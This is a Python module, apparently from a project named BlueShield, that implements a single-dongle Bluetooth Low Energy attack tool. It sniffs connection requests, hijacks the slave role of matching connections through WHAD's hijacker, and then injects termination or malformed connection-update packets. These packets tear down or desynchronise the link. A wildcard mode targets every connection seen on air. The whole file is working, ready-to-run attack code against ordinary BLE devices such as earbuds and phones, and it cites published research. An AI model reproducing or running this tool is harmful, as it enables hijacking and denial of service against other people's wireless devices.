"""
BlueShield HijackTerminator (v7.7)

Single-dongle replacement for AutoTerminator.

Why this exists
---------------
AutoTerminator uses two ButteRFly dongles: one observes CONNECT_IND events,
the other injects LL_TERMINATE_IND. That design fails for two reasons:

  1. The two dongles draw more current than the Pi 4's 5V rail can
     sustain — we see "Undervoltage detected!" in dmesg and one dongle
     re-enumerates mid-attack (observed 2026-04-21 during v7.6 audit).

  2. WHAD does not synchronize connection state across separate radios.
     Even with both dongles powered, the injector has no knowledge of
     the target connection's anchor point, hop map, or channel index.
     Raw `inject_to_slave()` on the second dongle fires packets on the
     wrong channel at the wrong time and the peer never sees them.

HijackTerminator solves both by using one ButteRFly:

  1. Sniff CONNECT_IND on ADV channels 37/38/39 to discover a live
     connection matching the kill list.
  2. Switch the *same* dongle into Hijacker mode and call
     `hijack_slave()`. The ButteRFly firmware then (a) follows the
     connection's channel hopping, (b) races the real slave for the
     next connection event, and (c) desynchronises the victim so that
     the dongle becomes the authoritative slave.
  3. Once hijack succeeds, send `LL_TERMINATE_IND` (code 0x13,
     "remote user terminated connection") on the connection data
     channel. The master accepts it because it now comes from the
     radio that owns the slave role.

Reference: Cayre et al., "InjectaBLE: Injecting Malicious Traffic into
Established BLE Connections." IEEE/IFIP DSN 2021, §IV.C (slave-side
hijack).
"""
from __future__ import annotations

import os
import threading
import time
from typing import Optional, Set


try:
    from whad.device import WhadDevice
    from whad.ble.connector.sniffer import Sniffer as BLESniffer
    from whad.ble.connector.hijacker import Hijacker as BLEHijacker
    from scapy.layers.bluetooth4LE import (
        BTLE, BTLE_ADV, BTLE_CONNECT_REQ, BTLE_DATA, BTLE_CTRL,
        LL_TERMINATE_IND, LL_CONNECTION_UPDATE_IND,
    )
    HAS_DEPS = True
except ImportError:
    HAS_DEPS = False


class HijackTerminator:
    """Single-ButteRFly pipeline: sniff → hijack_slave → LL_TERMINATE_IND."""

    # v7.7: post-hijack action — what to do once we own the slave role
    ACTION_TERMINATE = "terminate"   # send LL_TERMINATE_IND (clean disconnect)
    ACTION_DESYNC    = "desync"      # send LL_CONNECTION_UPDATE_IND with broken
                                     # parameters (instant in the past) — peer
                                     # supervision-timeouts within ~6 s

    def __init__(self, port: str = "/dev/ttyACM0",
                 action: str = ACTION_TERMINATE):
        self.port = port
        self.action = action if action in (self.ACTION_TERMINATE,
                                           self.ACTION_DESYNC) \
                              else self.ACTION_TERMINATE
        self._device = None
        self._sniffer = None
        self._hijacker = None
        self.kill_list: Set[str] = set()
        self._thread: Optional[threading.Thread] = None
        self._stop = threading.Event()
        self._start_time: float = 0.0

        # telemetry
        self.connect_inds_seen: int = 0
        self.hijacks_attempted: int = 0
        self.hijacks_succeeded: int = 0
        self.terminations_sent: int = 0
        self.desyncs_sent: int = 0
        self.last_target_aa: Optional[int] = None
        self.last_target_mac: Optional[str] = None
        self.last_hijack_status: Optional[str] = None
        self.last_error: Optional[str] = None
        self.is_active: bool = False

    def set_action(self, action: str):
        if action in (self.ACTION_TERMINATE, self.ACTION_DESYNC):
            self.action = action

    def add_target(self, mac: str):
        self.kill_list.add(mac.upper().strip())

    def remove_target(self, mac: str):
        self.kill_list.discard(mac.upper().strip())

    def target_all(self):
        """Wildcard: hijack ANY new connection seen on air."""
        self.kill_list.add("FF:FF:FF:FF:FF:FF")

    def start(self) -> bool:
        if not HAS_DEPS:
            self.last_error = "whad or scapy missing"
            return False
        if self.is_active:
            return True
        if not os.path.exists(self.port):
            self.last_error = f"port {self.port} not found"
            return False
        try:
            self._device = WhadDevice.create(f"uart:{self.port}")
            self._device.open()
            self._device.discover()
        except Exception as e:
            self.last_error = f"device open: {type(e).__name__}: {e}"
            return False

        self._stop.clear()
        self._start_time = time.monotonic()
        self.is_active = True
        self._thread = threading.Thread(
            target=self._main_loop, daemon=True, name="hijack-term")
        self._thread.start()
        return True

    def stop(self) -> bool:
        self._stop.set()
        self.is_active = False
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=3.0)
        for conn in (self._hijacker, self._sniffer):
            if conn:
                try: conn.stop()
                except Exception: pass
        if self._device:
            try: self._device.close()
            except Exception: pass
        self._device = None
        self._sniffer = None
        self._hijacker = None
        return True

    # ------------------------------------------------------------------

    def _main_loop(self):
        """Outer loop: sniff for CONNECT_IND, hijack, terminate, repeat."""
        try:
            self._sniffer = BLESniffer(self._device)
            self._sniffer.sniff_advertisements()
            self._sniffer.start()
        except Exception as e:
            self.last_error = f"sniffer setup: {type(e).__name__}: {e}"
            return

        while not self._stop.is_set():
            target = self._wait_for_connect_ind(timeout_s=5.0)
            if target is None:
                continue
            aa, mac = target
            self.last_target_aa = aa
            self.last_target_mac = mac

            # Stop the sniffer before switching roles — ButteRFly cannot
            # sniff and hijack at the same time on one radio.
            try: self._sniffer.stop()
            except Exception: pass

            self._attempt_hijack_and_terminate(aa, mac)

            # Return to sniff mode so we can catch the next target.
            try:
                self._sniffer = BLESniffer(self._device)
                self._sniffer.sniff_advertisements()
                self._sniffer.start()
            except Exception as e:
                self.last_error = f"sniffer restart: {e}"
                return

    def _wait_for_connect_ind(self, timeout_s: float):
        """Poll the sniffer for CONNECT_IND matching a kill-list MAC."""
        deadline = time.monotonic() + timeout_s
        while not self._stop.is_set() and time.monotonic() < deadline:
            try:
                for pkt in self._sniffer.sniff(timeout=0.5):
                    if self._stop.is_set():
                        return None
                    if BTLE_CONNECT_REQ not in pkt:
                        continue
                    cr = pkt[BTLE_CONNECT_REQ]
                    adv_mac = str(getattr(cr, "AdvA", "") or "").upper()
                    aa = int(getattr(cr, "AA", 0) or
                             getattr(cr, "access_addr", 0) or 0)
                    if not adv_mac or not aa:
                        continue
                    self.connect_inds_seen += 1
                    if adv_mac in self.kill_list or \
                       "FF:FF:FF:FF:FF:FF" in self.kill_list:
                        return (aa, adv_mac)
            except Exception:
                time.sleep(0.2)
        return None

    def _attempt_hijack_and_terminate(self, aa: int, mac: str):
        """Upgrade sniffer → hijacker, take the slave role, send TERMINATE."""
        self.hijacks_attempted += 1
        try:
            self._hijacker = BLEHijacker(self._device)
        except Exception as e:
            self.last_error = f"hijacker ctor: {type(e).__name__}: {e}"
            self.last_hijack_status = "ctor_failed"
            return

        try:
            # Hijacker.hijack() takes access address; connection parameters
            # (hop, channel map, CRCinit) are recovered on-chip by the
            # ButteRFly firmware as the connection traffic flows.
            result = self._hijacker.hijack_slave(
                access_address=aa, timeout=5.0
            )
        except TypeError:
            try:
                result = self._hijacker.hijack_slave(aa)
            except Exception as e:
                self.last_error = f"hijack_slave: {type(e).__name__}: {e}"
                self.last_hijack_status = "hijack_raised"
                try: self._hijacker.stop()
                except Exception: pass
                self._hijacker = None
                return
        except Exception as e:
            self.last_error = f"hijack_slave: {type(e).__name__}: {e}"
            self.last_hijack_status = "hijack_raised"
            try: self._hijacker.stop()
            except Exception: pass
            self._hijacker = None
            return

        if not result:
            self.last_hijack_status = "hijack_no_lock"
            try: self._hijacker.stop()
            except Exception: pass
            self._hijacker = None
            return

        self.hijacks_succeeded += 1
        self.last_hijack_status = "locked"

        # Action 1 — TERMINATE: send LL_TERMINATE_IND on the data channel.
        #   Master accepts it as a legitimate disconnect (peer-initiated).
        # Action 2 — DESYNC: send LL_CONNECTION_UPDATE_IND with an instant
        #   set in the past relative to the master's expected connection
        #   event count. The master applies the update and never finds the
        #   slave on the new parameters; supervision-timeout fires within
        #   the configured timeout window (~6 s default for AirPods/iOS).
        #   Reference: Cayre InjectaBLE DSN 2021 §IV.C "Master role hijack".
        try:
            if self.action == self.ACTION_DESYNC:
                pdu = (BTLE(access_addr=aa) /
                       BTLE_DATA(LLID=3) /
                       BTLE_CTRL() /
                       LL_CONNECTION_UPDATE_IND(
                           win_size=1,
                           win_offset=0,
                           interval=6,           # 7.5 ms (1.25 ms units × 6)
                           latency=0,
                           timeout=10,           # 100 ms supervision timeout
                           instant=1,            # well in the past
                       ))
                for _ in range(3):
                    try:
                        self._hijacker.send_pdu(pdu)
                    except AttributeError:
                        self._hijacker.send_ctrl_pdu(pdu)
                    self.desyncs_sent += 1
                    time.sleep(0.010)
            else:
                pdu = (BTLE(access_addr=aa) /
                       BTLE_DATA(LLID=3) /
                       BTLE_CTRL() /
                       LL_TERMINATE_IND(code=0x13))
                for _ in range(3):
                    try:
                        self._hijacker.send_pdu(pdu)
                    except AttributeError:
                        self._hijacker.send_ctrl_pdu(pdu)
                    self.terminations_sent += 1
                    time.sleep(0.010)
        except Exception as e:
            self.last_error = f"{self.action}: {type(e).__name__}: {e}"
        finally:
            try: self._hijacker.stop()
            except Exception: pass
            self._hijacker = None

    # ------------------------------------------------------------------

    def get_stats(self) -> dict:
        return {
            "is_active": self.is_active,
            "action": self.action,
            "desyncs_sent": self.desyncs_sent,
            "elapsed_seconds": (time.monotonic() - self._start_time
                                if self._start_time else 0.0),
            "kill_list_size": len(self.kill_list),
            "kill_list": list(self.kill_list),
            "connect_inds_seen": self.connect_inds_seen,
            "hijacks_attempted": self.hijacks_attempted,
            "hijacks_succeeded": self.hijacks_succeeded,
            "terminations_sent": self.terminations_sent,
            "last_target_aa_hex": (f"0x{self.last_target_aa:08x}"
                                   if self.last_target_aa else None),
            "last_target_mac": self.last_target_mac,
            "last_hijack_status": self.last_hijack_status,
            "port": self.port,
            "last_error": self.last_error,
            "backend": "hijack_terminator_v1",
        }
